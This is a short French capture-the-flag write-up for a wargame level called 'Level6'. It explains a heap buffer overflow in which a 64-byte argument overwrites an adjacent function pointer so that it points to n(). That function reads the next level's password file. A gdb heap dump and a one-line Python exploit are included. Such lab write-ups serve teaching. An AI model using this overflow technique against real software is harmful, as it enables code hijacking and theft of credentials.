## Level6

L'exécutable prend un argument.

On a deux fonctions importantes : la fonction `m()` se contente d'afficher "Nope" tandis que la fonction `n()` lance la commande `system("bin/cat /home/user/level7/.pass")`, cette dernière est inutilisée.

Dans le main, deux allocations sont faites sur la heap avec `malloc`, une de 64 octets dans laquelle sera stockée `argv[1]` et une de 4 octets, la taille d'un pointeur sur fonction.

Le pointeur sur fonction prend l'adresse de `m()`.

```gdb
0x804a008:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a018:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a028:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a038:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a048:      0x00000000      0x00000011      0x08048468      0x00000000
```
*État de la heap en remplissant simplement le buffer. On voit l'adresse de `m` après le buffer de 64 octets et 8 octets de  métadonnées de `malloc`.*

On va donc devoir écrire l'adresse de la fonction `n()` là ou est écrite celle de `m()`.

Notre argument sera donc formaté comme suit:

```
[64 octets] + [8 octets] + [4 Octets]
  buffer       metadata    n() address
```

#### Solution:

`./level6 $(python -c 'print("A"* 72 + "\x54\x84\x04\x08")')`